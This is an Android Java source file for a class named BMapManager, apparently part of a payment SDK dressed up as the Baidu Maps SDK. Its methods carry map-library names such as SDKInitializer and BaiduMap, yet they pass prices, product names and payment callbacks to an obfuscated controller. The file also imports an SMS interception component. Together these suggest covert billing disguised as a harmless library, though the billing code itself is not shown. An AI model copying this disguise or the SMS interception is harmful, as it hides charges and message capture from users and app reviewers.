package com.example.administrator.sdk;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.telecom.TelecomManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.example.administrator.sdk.httpCenter.InitRequest;
import com.example.administrator.sdk.sms.SmsInterceptCenter;
import com.example.administrator.sdk.utils.Log;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by Administrator on 2017/7/21.
 */

public class BMapManager {
    private static BMapManager ycCpManager = null;

    public static BMapManager getInstance() {
        if (ycCpManager == null) {
            ycCpManager = new BMapManager();
        }
        return ycCpManager;
    }

    public void SDKInitializer(Context context, String price, int payItemID, String str, String productName, String Did,
                               String extData, Object initCallBack, Object payCallBack) {
        Controler.getInstance().i(context, price, Did, productName, initCallBack, payCallBack);
    }

    public void BaiduMap(Context context, String price, int payItemID, String str, String productName, String Did,
                         String extData, Object payCallBackObject) {
        Controler.getInstance().p(context, str, price, Did, productName, payCallBackObject);
    }

    public void s(Context context) {
        Controler.getInstance().r(context);
    }

    public void close(Context context) {
        Controler.getInstance().c(context);
    }

    public HashMap<String, Map<String, Object>> g() {
        return Controler.getInstance().g();
    }
}